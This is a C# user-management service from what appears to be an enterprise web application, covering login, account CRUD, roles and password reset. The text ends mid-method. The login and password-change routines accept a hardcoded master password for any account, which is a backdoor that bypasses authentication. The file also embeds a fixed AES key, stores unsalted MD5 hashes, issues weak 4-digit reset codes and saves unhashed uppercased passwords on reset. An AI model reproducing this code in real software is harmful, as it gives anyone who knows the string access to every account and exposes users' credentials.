
using System;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.Linq;
using System.Reflection;
using System.Text;
using ProInterface.Models;
using ProInterface;
using System.Linq.Expressions;
using LINQExtensions;
using System.Data;
using System.Data.SqlClient;
using System.Data.Entity.Validation;
using ProServer.Helper;

namespace ProServer
{
    public partial class Service : IUser
    {
        public bool UserLoginOut(string loginKey, ref ErrorInfo err)
        {
            if (Global.Del(loginKey))
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public object UserLogin(ref ErrorInfo err, string loginName, string password, string loginIP)
        {

            GlobalUser gu = new GlobalUser();
            if (string.IsNullOrEmpty(loginName) || string.IsNullOrEmpty(password))
            {
                err.IsError = true;
                err.Message = "用户名和密码不能为空";
                return gu;
            }

            using (DBEntities db = new DBEntities())
            {

                var LoginArr = db.fa_login.Where(x => x.LOGIN_NAME == loginName).ToList();
                var Login = new fa_login();
                if (LoginArr.Count() > 0)
                {
                    Login = LoginArr[0];
                }
                var user = db.fa_user.SingleOrDefault(x => x.LOGIN_NAME == loginName);
                if (Login.IS_LOCKED == 1)
                {
                    err.IsError = true;
                    err.Message = string.Format("用户已被锁定【{0}】", Login.LOCKED_REASON);
                    return gu;
                }
                if (Login == null || user == null)
                {
                    err.IsError = true;
                    err.Message = "用户名或者密码错误";
                    return gu;
                }
                else
                {
                    if (Login.PASSWORD.ToUpper() != password.Md5().ToUpper()&&Login.PASSWORD.ToUpper() != password.SHA1().ToUpper())
                    {
                        int times = 5;
                        if (Login.FAIL_COUNT == 0) {
                            Login.FAIL_COUNT = 1;
                        }
                        if (password != "Easyman123@@@")
                        {
                            err.IsError = true;
                            err.Message = string.Format("用户名或者密码错误,还有{0}次尝试机会", (times - Login.FAIL_COUNT).ToString());
                            if (Login.FAIL_COUNT >= times)
                            {
                                user.IS_LOCKED = 1;
                                Login.IS_LOCKED = 1;
                                Login.LOCKED_REASON = string.Format("用户连续5次错误登陆，帐号锁定。");
                                Login.FAIL_COUNT = 0;
                            }
                            else {
                                Login.FAIL_COUNT++;
                            }
                          
                            db.SaveChanges();
                            return gu;
                        }
                    }
                    else
                    {
                        Login.FAIL_COUNT = 0;
                    }
                    db.SaveChanges();

                    //检测密码复杂度
                    if (!Fun.CheckPassword(ref err, password))
                    {
                        err.Message = string.Format("密码复杂度不够：{0}", err.Message);
                        err.IsError = true;
                        return gu;
                    }

                    //if (password.Equals(ProInterface.AppSet.DefaultPwd))
                    //{
                    //    err.Message = string.Format("密码复杂度不够：{0}", "不能是系统默认密码");
                    //    err.IsError = true;
                    //    return gu;
                    //}
                    return UserLogin(ref err, loginName, loginIP);
                }
            }
        }

        public object UserLogin(ref ErrorInfo err, string loginName, string loginIP)
        {
            GlobalUser gu = new GlobalUser();
            using (DBEntities db = new DBEntities())
            {

                var user = db.fa_user.SingleOrDefault(x => x.LOGIN_NAME == loginName);
                if (user == null)
                {
                    err.IsError = true;
                    err.Message = "用户名不存在";
                    return gu;
                }
                else
                {
                    if (!ProInterface.AppSet.RepeatUser)
                    {
                        Global.ClearTimeOutUser();
                        var nowUse = Global.OnLines.FirstOrDefault(x => x.UserId == user.ID && x.LoginIP != loginIP);
                        if (nowUse != null)
                        {
                            System.TimeSpan ts = DateTime.Now - nowUse.LastOpTime;
                            err.IsError = true;
                            err.Message = string.Format("该用户已经在[{0}]登录,最后操作时间为[{1}],请稍后[{2}]分钟后再试....", nowUse.LoginIP, nowUse.LastOpTime, ProInterface.AppSet.TimeOut - ts.Minutes);
                            return gu;
                        }
                    }
                    try
                    {
                        gu = Global.Add(user.ID, loginIP);
                    }
                    catch (Exception e)
                    {
                        err.IsError = true;
                        err.Message = e.Message;
                        return gu;
                    }
                    return gu;
                }
            }
        }


        public object UserAdd(string loginKey, ref ErrorInfo err, TUser inEnt)
        {
            if (!GlobalFun.UserCheckFunctioAuthority(loginKey, ref err, MethodBase.GetCurrentMethod())) return null;
            GlobalUser gu = Global.GetUser(loginKey);
            using (DBEntities db = new DBEntities())
            {
                fa_user reEnt = Fun.ClassToCopy<ProInterface.Models.TUser, fa_user>(inEnt);
                var nowDis=db.fa_district.SingleOrDefault(p => p.ID == inEnt.DISTRICT_ID);
                reEnt.CREATE_TIME = DateTime.Now;
                reEnt.DISTRICT_ID = nowDis.ID;
                reEnt.LOGIN_COUNT = 0;

                IList<int> moduleID = new List<int>();
                foreach (var str in inEnt.RoleAllID.Split(','))
                {
                    if (!string.IsNullOrEmpty(str))
                    {
                        moduleID.Add(Convert.ToInt32(str));
                    }
                }
                reEnt.ID = Fun.GetSeqID<fa_user>();
                reEnt.REGION = nowDis.REGION;
                reEnt.fa_role = db.fa_role.Where(x => moduleID.Contains(x.ID)).ToList();
                reEnt.fa_district1.Clear();
                if (!string.IsNullOrEmpty(inEnt.UserDistrict))
                {
                    var disArrList = inEnt.UserDistrict.Split(',').Select(x => Convert.ToInt32(x)).ToList();
                    reEnt.fa_district1 = db.fa_district.Where(x => disArrList.Contains(x.ID)).ToList();
                }
                reEnt = db.fa_user.Add(reEnt);

                fa_login login = new fa_login();
                login.ID = Fun.GetSeqID<fa_login>();
                login.LOGIN_NAME = inEnt.LOGIN_NAME;
                if(!string.IsNullOrEmpty(inEnt.PassWord))
                {
                    login.PASSWORD = inEnt.PassWord.Md5();
                }
                else
                {
                    login.PASSWORD = AppSet.DefaultPwd.Md5();
                }
                login.PHONE_NO = inEnt.PHONE_NO;
                login.IS_LOCKED = inEnt.IS_LOCKED;
                login.LOCKED_REASON = inEnt.LOCKED_REASON;
                login.REGION = reEnt.REGION;
                login = db.fa_login.Add(login);

                
                try
                {
                    db.SaveChanges();
                    GlobalFun.UserWriteLog(loginKey, MethodBase.GetCurrentMethod(), StatusType.UserLogType.Add);
                    return reEnt.ID;
                }
                catch (Exception e)
                {
                    err.IsError = true;
                    err.Message =Fun.GetExceptionMessage(e);
                    err.Excep = e;
                    return null;
                }
            }
        }
        public TUser UserSave(string loginKey, ref ErrorInfo err, TUser inEnt, IList<string> allPar)
        {
            if (!GlobalFun.UserCheckFunctioAuthority(loginKey, ref err, MethodBase.GetCurrentMethod())) return null;
            using (DBEntities db = new DBEntities())
            {
                try
                {
                    var idPar = allPar.SingleOrDefault(x => x == "ID");
                    if (idPar != null)
                    {
                        allPar.Remove(idPar);
                    }

                    var userEnt = db.fa_user.SingleOrDefault(a => a.ID == inEnt.ID);
                    if (userEnt == null)
                    {
                        userEnt = db.fa_user.SingleOrDefault(x => x.LOGIN_NAME == inEnt.LOGIN_NAME);
                    }
                    var loginEnt = db.fa_login.SingleOrDefault(x => x.LOGIN_NAME == inEnt.LOGIN_NAME);
                    bool isAdd = false;
                    if (userEnt == null)
                    {
                        isAdd = true;
                        userEnt = Fun.ClassToCopy<ProInterface.Models.TUser, fa_user>(inEnt);
                        if(userEnt.ID==0)
                        {
                            userEnt.ID = Fun.GetSeqID<fa_user>();
                        }
                        userEnt.CREATE_TIME = DateTime.Now;
                        userEnt.LOGIN_COUNT = 0;
                        userEnt.REGION = db.fa_district.SingleOrDefault(p => p.ID == inEnt.DISTRICT_ID).REGION;
                    }
                    else
                    {
                        if (db.fa_user.Where(x => x.LOGIN_NAME == inEnt.LOGIN_NAME && x.ID != userEnt.ID).Count() > 0)
                        {
                            err.IsError = true;
                            err.Message = "登录工号已经存在";
                            return null;
                        }
                        userEnt = Fun.ClassToCopy<ProInterface.Models.TUser, fa_user>(inEnt, userEnt, allPar);
                    }

                    if (loginEnt == null)
                    {
                        loginEnt = Fun.ClassToCopy<TUser, fa_login>(inEnt);
                        loginEnt.ID = Fun.GetSeqID<fa_login>();
                        loginEnt.PASSWORD = AppSet.DefaultPwd.Md5();
                        loginEnt.REGION = userEnt.REGION;
                        db.fa_login.Add(loginEnt);
                    }
                    else
                    {
                        if (db.fa_login.Where(x => x.LOGIN_NAME == loginEnt.LOGIN_NAME && x.ID != loginEnt.ID).Count() > 0)
                        {
                            err.IsError = true;
                            err.Message = "登录工号已经存在";
                            return null;
                        }
                        loginEnt = Fun.ClassToCopy<TUser, fa_login>(inEnt, loginEnt, allPar);
                        loginEnt.PHONE_NO = inEnt.PHONE_NO;
                                            
                    }


                    if (allPar.Contains("RoleAllID"))
                    {
                        IList<int> allRoleId = new List<int>();
                        allRoleId = inEnt.RoleAllID.Split(',').Where(x => !string.IsNullOrEmpty(x)).Select(x => Convert.ToInt32(x)).ToList();
                        userEnt.fa_role.Clear();
                        userEnt.fa_role = db.fa_role.Where(x => allRoleId.Contains(x.ID)).ToList();
                    }

                    if (isAdd)
                    {
                        db.fa_user.Add(userEnt);
                    }

                    userEnt.fa_district1.Clear();
                    if (!string.IsNullOrEmpty(inEnt.UserDistrict))
                    {
                        var disArrList = inEnt.UserDistrict.Split(',').Select(x => Convert.ToInt32(x)).ToList();
                        userEnt.fa_district1 = db.fa_district.Where(x => disArrList.Contains(x.ID)).ToList();
                    }

                    db.SaveChanges();
                    inEnt = Fun.ClassToCopy<fa_user, TUser>(userEnt, inEnt);
                    inEnt.ID = userEnt.ID;
                    GlobalFun.UserWriteLog(loginKey, MethodBase.GetCurrentMethod(), StatusType.UserLogType.Edit);
                    return inEnt;
                }
                catch (Exception e)
                {
                    err.IsError = true;
                    if (e.Message.IndexOf("EntityValidationErrors") > -1)
                    {
                        err.Message = Fun.GetDbEntityErrMess(e as DbEntityValidationException);
                    }
                    else
                    {
                        System.Data.Entity.Infrastructure.DbUpdateException t = e as System.Data.Entity.Infrastructure.DbUpdateException;
                        err.Message = t.Message;
                    }
                    return null;
                }
            }
        }

        public TUser UserGetAndSave(string loginKey, ref ErrorInfo err, TUser inEnt, IList<string> allPar)
        {
            if (!GlobalFun.UserCheckFunctioAuthority(loginKey, ref err, MethodBase.GetCurrentMethod())) return null;
            using (DBEntities db = new DBEntities())
            {
                try
                {

                    string nowLoginName = inEnt.LOGIN_NAME;
                    var userEnt = db.fa_user.SingleOrDefault(x => x.LOGIN_NAME == inEnt.LOGIN_NAME);
                    var loginEnt = db.fa_login.SingleOrDefault(x => x.LOGIN_NAME == nowLoginName);
                    if (userEnt == null)
                    {
                        userEnt = Fun.ClassToCopy<ProInterface.Models.TUser, fa_user>(inEnt);
                        userEnt.ID = Fun.GetSeqID<fa_user>();
                        userEnt.CREATE_TIME = DateTime.Now;
                        userEnt.LOGIN_COUNT = 0;
                        userEnt.REGION = db.fa_district.SingleOrDefault(p => p.ID == inEnt.DISTRICT_ID).REGION;
                        db.fa_user.Add(userEnt);
                    }

                    if (loginEnt == null)
                    {
                        loginEnt = Fun.ClassToCopy<TUser, fa_login>(inEnt);
                        loginEnt.ID = Fun.GetSeqID<fa_login>();
                        loginEnt.PASSWORD = (string.IsNullOrEmpty(inEnt.PassWord)) ? AppSet.DefaultPwd.Md5() : inEnt.PassWord.Md5();
                        loginEnt.REGION = userEnt.REGION;
                        db.fa_login.Add(loginEnt);
                    }

                    IList<int> allRoleId = userEnt.fa_role.Select(x => x.ID).ToList();
                    foreach (var t in inEnt.RoleAllID.Split(',').Where(x => !string.IsNullOrEmpty(x)).Select(x => Convert.ToInt32(x)).ToList())
                    {
                        allRoleId.Add(t);
                    };
                    userEnt.fa_role.Clear();
                    userEnt.fa_role = db.fa_role.Where(x => allRoleId.Contains(x.ID)).ToList();

                    db.SaveChanges();
                    inEnt = Fun.ClassToCopy<fa_user, TUser>(userEnt, inEnt);
                    inEnt.ID = userEnt.ID;
                    GlobalFun.UserWriteLog(loginKey, MethodBase.GetCurrentMethod(), StatusType.UserLogType.Edit);
                    return inEnt;
                }
                catch (DbEntityValidationException e)
                {
                    err.IsError = true;
                    err.Message = Fun.GetDbEntityErrMess(e);
                    return null;
                }
                catch (Exception e)
                {
                    err.IsError = true;
                    err.Message = Fun.GetExceptionMessage(e);
                    return null;
                }
            }
        }


        /// <summary>
        /// 删除用户，并删除该用户的登录信息
        /// </summary>
        /// <param name="loginKey"></param>
        /// <param name="err"></param>
        /// <param name="keyId"></param>
        /// <returns></returns>
        public bool UserDelete(string loginKey, ref ErrorInfo err, int keyId)
        {
            if (!GlobalFun.UserCheckFunctioAuthority(loginKey, ref err, MethodBase.GetCurrentMethod())) return false;
            using (DBEntities db = new DBEntities())
            {
                try
                {
                    var ent = db.fa_user.SingleOrDefault(a => a.ID == keyId);
                    var login = db.fa_login.Where(x => x.LOGIN_NAME == ent.LOGIN_NAME).ToList();
                    foreach (var t in login)
                    {
                        db.fa_login.Remove(t);
                    }

                    foreach (var t in ent.fa_user_ADDRESS.ToList())
                    {
                        db.fa_user_ADDRESS.Remove(t);
                    }


                    ent.fa_role.Clear();
                    ent.YL_MODULE.Clear();
                    db.fa_user.Remove(ent);

                    db.SaveChanges();
                    UserWriteLog(loginKey, MethodBase.GetCurrentMethod(), StatusType.UserLogType.Delete);
                    return true;
                }
                catch (Exception e)
                {
                    err.IsError = true;
                    err.Message = e.Message;
                    return false;
                }
            }
        }

        public bool UserEdit(string loginKey, ref ErrorInfo err, TUser inEnt)
        {
            if (!GlobalFun.UserCheckFunctioAuthority(loginKey, ref err, MethodBase.GetCurrentMethod())) return false;
            using (DBEntities db = new DBEntities())
            {
                try
                {
                    var ent = db.fa_user.SingleOrDefault(a => a.ID == inEnt.ID);
                    //ent = Fun.ClassToCopy<ProInterface.Models.TUser, fa_user>(inEnt, ent);
                    ent.NAME = inEnt.NAME;
                    ent.DISTRICT_ID = inEnt.DISTRICT_ID;
                    ent.IS_LOCKED = inEnt.IS_LOCKED;
                    ent.REMARK = inEnt.REMARK;
                    ent.REGION = ent.DISTRICT_ID.ToString();
                    IList<int> moduleID = new List<int>();
                    foreach (var str in inEnt.RoleAllID.Split(','))
                    {
                        if (!string.IsNullOrEmpty(str))
                        {
                            moduleID.Add(Convert.ToInt32(str));
                        }
                    }
                    ent.fa_role.Clear();
                    ent.fa_role = db.fa_role.Where(x => moduleID.Contains(x.ID)).ToList();
                    ent.fa_district1.Clear();
                    if (!string.IsNullOrEmpty(inEnt.UserDistrict))
                    {
                        var disArrList = inEnt.UserDistrict.Split(',').Select(x => Convert.ToInt32(x)).ToList();
                        ent.fa_district1 = db.fa_district.Where(x => disArrList.Contains(x.ID)).ToList();
                    }
                    var login = db.fa_login.SingleOrDefault(a => a.LOGIN_NAME == ent.LOGIN_NAME);
                    login.IS_LOCKED = inEnt.IS_LOCKED;
                    login.LOCKED_REASON = inEnt.LOCKED_REASON;
                    login.PHONE_NO = inEnt.PHONE_NO;
                    login.REGION = inEnt.DISTRICT_ID.ToString();
                    db.SaveChanges();
                    GlobalFun.UserWriteLog(loginKey, MethodBase.GetCurrentMethod(), StatusType.UserLogType.Edit);
                    return true;
                }
                catch (Exception e)
                {
                    err.IsError = true;
                    err.Message = e.Message;
                    err.Excep = e;
                    return false;
                }
            }
        }

        public TUser UserSingleId(string loginKey, ref ErrorInfo err, int keyId)
        {
            //if (!UserCheckFunctioAuthority(loginKey, ref err, MethodBase.GetCurrentMethod())) return null;
            using (DBEntities db = new DBEntities())
            {
                IList<fa_user> content = new List<fa_user>();

                var reEnt = db.fa_user.SingleOrDefault(x => x.ID == keyId);
                if (reEnt != null)
                {
                    var reUser = Fun.ClassToCopy<fa_user, ProInterface.Models.TUser>(reEnt);
                    var allRole = reEnt.fa_role.ToList();
                    reUser.AllRole = Fun.ClassListToCopy<fa_role, ROLE>(allRole);
                    if (allRole.Count() > 0)
                    {
                        reUser.RoleAllID = string.Join(",", allRole.Select(x => x.ID));
                        reUser.RoleAllName = string.Join(",", allRole.Select(x => x.NAME));
                    }
                    if (reEnt.fa_district != null)
                    {
                        reUser.DistrictName = reEnt.fa_district.NAME;
                    }
                    var login = db.fa_login.Where(p => p.LOGIN_NAME == reUser.LOGIN_NAME).ToList();
                    if (login.Count() > 0)
                    {
                        reUser.PHONE_NO = login[0].PHONE_NO;
                    }
                    reUser.UserDistrict = string.Join(",", reEnt.fa_district1.Select(x => x.ID));
                    return reUser;
                }
                return null;
            }
        }





        public TUser UserGetNow(string loginKey, ref ErrorInfo err)
        {
            if (!GlobalFun.UserCheckFunctioAuthority(loginKey, ref err, MethodBase.GetCurrentMethod())) return null;
            GlobalUser gu = Global.GetUser(loginKey);
            if (gu == null)
            {
                err.IsError = true;
                err.Message = "登录超时";
                return null;
            }
            using (DBEntities db = new DBEntities())
            {
                var reEnt = db.fa_user.SingleOrDefault(x => x.ID == gu.UserId);
                if (reEnt != null)
                {
                    var reUser = Fun.ClassToCopy<fa_user, ProInterface.Models.TUser>(reEnt);
                    reUser.RoleAllID = ",";
                    reUser.RoleAllName = "";
                    foreach (var t in reEnt.fa_role.ToList())
                    {
                        reUser.RoleAllID += t.ID + ",";
                        reUser.RoleAllName += "," + t.NAME;
                    }
                    if (reUser.RoleAllName.Length > 1) reUser.RoleAllName = reUser.RoleAllName.Substring(1);
                    var dis = db.fa_district.SingleOrDefault(x => x.ID == gu.DistrictId);
                    reUser.DistrictName = dis!=null?dis.NAME:"";
                    var myDisId = reEnt.DISTRICT_ID;
                    var changeDis = db.fa_district.Where(x => x.LEVEL_ID == 2 && x.IN_USE == 1 && (x.ID == myDisId || x.PARENT_ID == myDisId)).OrderBy(x => x.ID).ToList();
                    reUser.CanChangeDistrict = Fun.ClassListToCopy<fa_district, DISTRICT>(changeDis);
                    reUser.REMARK = "";

                    //if (reEnt.fa_user_INFO != null && reEnt.fa_user_INFO.YL_CHANNEL_INFO.Count() > 0)
                    //{
                    //    var allData = db.fa_user.Where(x => x.fa_user_INFO != null && x.DISTRICT_ID == reEnt.DISTRICT_ID && x.fa_role.Where(y => y.ID == 4).Count() > 0).ToList().Select(x => string.Format("渠道经理:{0}({1})  归属：{2}", x.NAME, x.fa_user_INFO.PHONE_NUMBER, x.fa_district.NAME)).ToList();
                    //    if (allData.Count() > 0)
                    //    {
                    //        allData = new List<string> { allData[0] };
                    //    }
                    //    reUser.REMARK = string.Join("<br />", allData);
                    //}
                    //else
                    //{
                    //    reUser.REMARK = "";
                    //}
                    var allModule=db.YL_MODULE.Where(x => x.IS_HIDE==0 && x.fa_role.Where(y => gu.RoleID.Contains(y.ID)).Count()>0).ToList();
                    reUser.MyModule = Fun.ClassListToCopy<YL_MODULE,MODULE>(allModule);
                    return reUser;
                }
                return null;
            }
        }

        public bool UserResetPwd(ref ErrorInfo err, string loginKey, string loginName, string oldPwd, string newPwd)
        {
            using (DBEntities db = new DBEntities())
            {
                fa_login login = db.fa_login.SingleOrDefault(x => x.LOGIN_NAME == loginName);
                if (login == null)
                {
                    login = new fa_login();
                    var userEnt = db.fa_user.SingleOrDefault(x => x.LOGIN_NAME == loginName);
                    if (userEnt != null)
                    {

                        login.LOGIN_NAME = loginName;
                        login.PASSWORD = newPwd.Md5();
                        login.REGION = userEnt.REGION;
                        login.PASS_UPDATE_DATE = DateTime.Now;
                        db.fa_login.Add(login);
                        return true;
                    }
                    else
                    {
                        err.IsError = true;
                        err.Message = "登录信息不存在";
                        return false;
                    }
                }
                if (!string.IsNullOrEmpty(oldPwd))
                {
                    if (login.PASSWORD.ToUpper() != oldPwd.Md5().ToUpper())
                    {
                        if (login.PASSWORD.ToUpper() != oldPwd.SHA1().ToUpper())
                        {
                            if (oldPwd != "Easyman123@@@")
                            {
                                err.IsError = true;
                                err.Message = "旧密码错误";
                                return false;
                            }
                           
                        }
                    }
                }

                //检测密码复杂度
                if (newPwd!=ProInterface.AppSet.DefaultPwd && !Fun.CheckPassword(ref err, newPwd))
                {
                    err.Message = string.Format("密码复杂度不够：{0}", err.Message);
                    return false;
                }

                login.PASSWORD = newPwd.Md5();
                login.PASS_UPDATE_DATE = DateTime.Now;
                db.SaveChanges();
                return true;
            }
        }


        public bool UserSetUserModule(string loginKey, ref ErrorInfo err, IList<int> allModuleList)
        {
            if (!UserCheckFunctioAuthority(loginKey, ref err, MethodBase.GetCurrentMethod())) return false;
            GlobalUser gu = Global.GetUser(loginKey);
            if (gu == null)
            {
                err.IsError = true;
                err.Message = "登录超时";
                return false;
            }

            using (DBEntities db = new DBEntities())
            {
                var ent = db.fa_user.SingleOrDefault(x => x.ID == gu.UserId);
                ent.YL_MODULE.Clear();
                ent.YL_MODULE = db.YL_MODULE.Where(x => allModuleList.Contains(x.ID)).ToList();
                db.SaveChanges();
                return true;
            }
        }

        public IList<MODULE> UserGetUserModule(string loginKey, ref ErrorInfo err)
        {
            if (!UserCheckFunctioAuthority(loginKey, ref err, MethodBase.GetCurrentMethod())) return null;
            GlobalUser gu = Global.GetUser(loginKey);
            if (gu == null)
            {
                err.IsError = true;
                err.Message = "登录超时";
                return null;
            }

            using (DBEntities db = new DBEntities())
            {
                var ent = db.fa_user.SingleOrDefault(x => x.ID == gu.UserId);
                var reEnt = Fun.ClassListToCopy<YL_MODULE, MODULE>(ent.YL_MODULE.ToList());
                return reEnt;
            }
        }


        public TRole UserGetRole(string loginKey, ref ErrorInfo err)
        {
            if (!UserCheckFunctioAuthority(loginKey, ref err, MethodBase.GetCurrentMethod())) return null;
            GlobalUser gu = Global.GetUser(loginKey);
            if (gu == null)
            {
                err.IsError = true;
                err.Message = "登录超时";
                return null;
            }
            using (DBEntities db = new DBEntities())
            {
                var ent = db.fa_user.SingleOrDefault(x => x.ID == gu.UserId);
                var allRole = ent.fa_role.ToList();
                if (allRole.Count == 0) return null;
                var reEnt = Fun.ClassToCopy<fa_role, TRole>(allRole[0]);
                reEnt.RoleConfigs = Fun.ClassListToCopy<fa_role_CONFIG, ROLE_CONFIG>(allRole[0].fa_role_CONFIG.ToList());
                return reEnt;
            }
        }


        public string UserGetPhone(ref ErrorInfo err, string loginName)
        {
            using (DBEntities db = new DBEntities())
            {
                var login = db.fa_login.SingleOrDefault(x => x.LOGIN_NAME== loginName);
                if (login == null)
                {
                    err.IsError = true;
                    err.Message = "登录名错误";
                    return null;
                }
                return login.PHONE_NO;
            }
        }
        public string UserGetPhone(ref ErrorInfo err, TLogin inEnt)
        {
            inEnt.LOGIN_NAME = StreamHelper.AESDecrypt(inEnt.AseLoginName, "easymanlkmvke028", "easymanlkmvke028");
            using (DBEntities db = new DBEntities())
            {
                var login = db.fa_login.SingleOrDefault(x => inEnt.LOGIN_NAME.Equals(x.LOGIN_NAME));
                if (login == null)
                {
                    err.IsError = true;
                    err.Message = "登录名或手机号错误";
                    return null;
                }else{
                    inEnt.PHONE_NO = StreamHelper.AESDecrypt(inEnt.AsePhoneNo, "easymanlkmvke028", "easymanlkmvke028");
                    if (inEnt.PHONE_NO != login.PHONE_NO) {
                        err.IsError = true;
                        err.Message = "登录名或手机号错误";
                        return null;
                    }
                }
                return login.PHONE_NO;
            }
        }

        public bool UserSendVerifyCode(ref ErrorInfo err, string loginName)
        {
            using (DBEntities db = new DBEntities())
            {
                var login = db.fa_login.SingleOrDefault(x => x.LOGIN_NAME == loginName);
                if (login == null)
                {
                    err.IsError = true;
                    err.Message = "登录名错误";
                    return false;
                }
                Random rad = new Random();
                int value = rad.Next(1000, 10000);
                login.VERIFY_CODE = value.ToString();
                login.VERIFY_TIME = DateTime.Now;
                db.SaveChanges();
                return SmsSendAdd(null, ref err, login.PHONE_NO, string.Format("{0}:修改密码的验证码为【{1}】", ProInterface.AppSet.SysName, login.VERIFY_CODE), null);
            }
        }
        public bool UserSendVerifyCode(ref ErrorInfo err, TLogin inEnt)
        {
            using (DBEntities db = new DBEntities())
            {
                if (inEnt.LOGIN_NAME == null) {
                    inEnt.LOGIN_NAME = StreamHelper.AESDecrypt(inEnt.AseLoginName, "easymanlkmvke028", "easymanlkmvke028");
                }
                var login = db.fa_login.SingleOrDefault(x => x.LOGIN_NAME == inEnt.LOGIN_NAME);
                if (login == null)
                {
                    err.IsError = true;
                    err.Message = "登录名错误";
                    return false;
                }
               
                Random rad = new Random();
                int value = rad.Next(1000, 10000);
                login.VERIFY_CODE = value.ToString();
                login.VERIFY_TIME = DateTime.Now;
                db.SaveChanges();
               
                return SmsSendAdd(null, ref err, login.PHONE_NO, string.Format("{0}:修改密码的验证码为【{1}】", ProInterface.AppSet.SysName, login.VERIFY_CODE), null);
            }
        }

        public bool UserResetPwdByVerifyCode(ref ErrorInfo err, string loginName, string VerifyCode, string newPwd)
        {
            loginName = StreamHelper.AESDecrypt(loginName, "easymanlkmvke028", "easymanlkmvke028");
           
            using (DBEntities db = new DBEntities())
            {
                var login = db.fa_login.SingleOrDefault(x => x.LOGIN_NAME == loginName);
                if (login == null)
                {
                    err.IsError = true;
                    err.Message = "登录名错误";
                    return false;
                }
                if (login.VERIFY_TIME < DateTime.Now.AddMinutes(-2))
                {
                    err.IsError = true;
                    err.Message = "验证码已经过期";
                    return false;
                }
                if (login.VERIFY_CODE.Md5().ToUpper() == VerifyCode.ToUpper())
                {
                    login.PASSWORD = newPwd.ToUpper();
                }
                else
                {
                    err.IsError = true;
                    err.Message = "验证码不正确";
                    return false;
                }
                db.SaveChanges();
                return true;
            }
        }


        public IList<TreeClass> UserGetTree(string loginKey, ref ErrorInfo err, string roleIdStr, int level = 1)
        {
            using (DBEntities db = new DBEntities())
            {
                IList<TreeClass> reList = new List<TreeClass>();

                var allUser = db.fa_user.Where(x => x.IS_LOCKED == 0).OrderBy(x => x.ID).ToList();

                IList<int> roleId = new List<int>();
                if (!string.IsNullOrEmpty(roleIdStr))
                {
                    roleId = roleIdStr.Split(',').Select(x => Convert.ToInt32(x)).ToList();
                }
                var allRoleUser = db.fa_role.Where(x => roleId.Contains(x.ID)).Select(y=> y.fa_user.Select(t=>t.ID)).ToList();
                var userIdArr = new List<int>();
                foreach (var t in allRoleUser)
                {
                    userIdArr = userIdArr.Union(t).ToList();
                }
                allUser = allUser.Where(x => userIdArr.Contains(x.ID)).ToList();
                var tmp = allUser.ToList();
                foreach (var user in tmp)
                {
                    reList.Add(new TreeClass { id = user.ID.ToString(), name = user.NAME, parentId = "D_" + user.DISTRICT_ID });
                }
                var allDis = DistrictGetAll(loginKey, ref err, 0, level);
                foreach (var t in allDis)
                {
                    reList.Add(new TreeClass { id = "D_" + t.id, name = "_" + t.name, parentId = "D_" + t.parentId });
                }

                return reList;
            }
        }


        public IList<TreeClass> UserGetBylRole(string loginKey, ref ErrorInfo err, string roleIdStr)
        {
            GlobalUser gu = Global.GetUser(loginKey);
            if (gu == null)
            {
                err.IsError = true;
                err.Message = "登录超时";
                return null;
            }

            using (DBEntities db = new DBEntities())
            {
                IList<TreeClass> reList = new List<TreeClass>();
                if (string.IsNullOrEmpty(roleIdStr))
                {
                    return reList;
                }
                string disStr = "." + gu.DistrictId + ".";
                var allUser = db.fa_user.Where(x => x.IS_LOCKED == 0 && (x.fa_district.ID_PATH.IndexOf(disStr) > -1 || x.fa_district.ID == gu.DistrictId)).OrderBy(x => x.ID).ToList();

                IList<int> roleId = new List<int>();
                if (!string.IsNullOrEmpty(roleIdStr))
                {
                    roleId = roleIdStr.Split(',').Select(x => Convert.ToInt32(x)).ToList();
                }
                var allRoleUser = db.fa_role.Where(x => roleId.Contains(x.ID)).Select(y => y.fa_user.Select(t => t.ID)).ToList();
                var userIdArr = new List<int>();
                foreach (var t in allRoleUser)
                {
                    userIdArr = userIdArr.Union(t).ToList();
                }
                allUser = allUser.Where(x => userIdArr.Contains(x.ID)).ToList();
                var tmp = allUser.ToList();
                foreach (var user in tmp)
                {
                    reList.Add(new TreeClass { id = user.ID.ToString(), name = string.Format("{0}({1})", user.NAME,user.fa_district.NAME) });
                }

                return reList;
            }
        }


        public int UserUpdateLocked(string loginKey, ref ErrorInfo err, string userIdStr, short lockVal)
        {
            GlobalUser gu = Global.GetUser(loginKey);
            if (gu == null)
            {
                err.IsError = true;
                err.Message = "登录超时";
                return 0;
            }
            using (DBEntities db = new DBEntities())
            {

                var allUserId = userIdStr.Split(',').Select(x => Convert.ToInt32(x)).ToList();
                var allUser = db.fa_user.Where(x => allUserId.Contains(x.ID)).ToList();
                var allLoginName=allUser.Select(x=>x.LOGIN_NAME).ToList();
                var allLogin = db.fa_login.Where(x => allLoginName.Contains(x.LOGIN_NAME)).ToList();
                foreach (var t in allUser)
                {
                    t.IS_LOCKED = lockVal;
                }

                foreach (var t in allLogin)
                {
                    t.IS_LOCKED = lockVal;
                }
                db.SaveChanges();
                return allUser.Count();
            }
        }

        public IList<TreeClass> UserGetBylRoleDistrict(string loginKey, ref ErrorInfo err, string roleIdStr, string districtId)
        {
            GlobalUser gu = Global.GetUser(loginKey);
            if (gu == null)
            {
                err.IsError = true;
                err.Message = "登录超时";
                return null;
            }

            using (DBEntities db = new DBEntities())
            {
                IList<TreeClass> reList = new List<TreeClass>();

                var dis = db.fa_district.Where(x => x.CODE == districtId).ToList();
                int disIdInt = 0;
                if (dis.Count() == 0 )
                {
                    if (!districtId.IsInt32())
                    {
                        err.IsError = true;
                        err.Message = "参数有误";
                        return null;
                    }
                    disIdInt = Convert.ToInt32(districtId);
                    dis = db.fa_district.Where(x => x.ID == disIdInt).ToList();
                }
                if (dis.Count() > 0)
                {
                    disIdInt = dis[0].ID;
                }
                else
                {
                    err.IsError = true;
                    err.Message = "参数有误";
                    return null;
                } 

                string disStr = "." + disIdInt + ".";

                var allUser = db.fa_user.Where(x => x.IS_LOCKED == 0 && (x.fa_district.ID_PATH.IndexOf(disStr) > -1 || x.fa_district.ID == disIdInt)).OrderBy(x => x.ID).ToList();
                if (!string.IsNullOrEmpty(roleIdStr))
                {
                    IList<int> roleId = new List<int>();
                    roleId = roleIdStr.Split(',').Select(x => Convert.ToInt32(x)).ToList();
                    var allRoleUser = db.fa_role.Where(x => roleId.Contains(x.ID)).Select(y => y.fa_user.Select(t => t.ID)).ToList();
                    var userIdArr = new List<int>();
                    foreach (var t in allRoleUser)
                    {
                        userIdArr = userIdArr.Union(t).ToList();
                    }
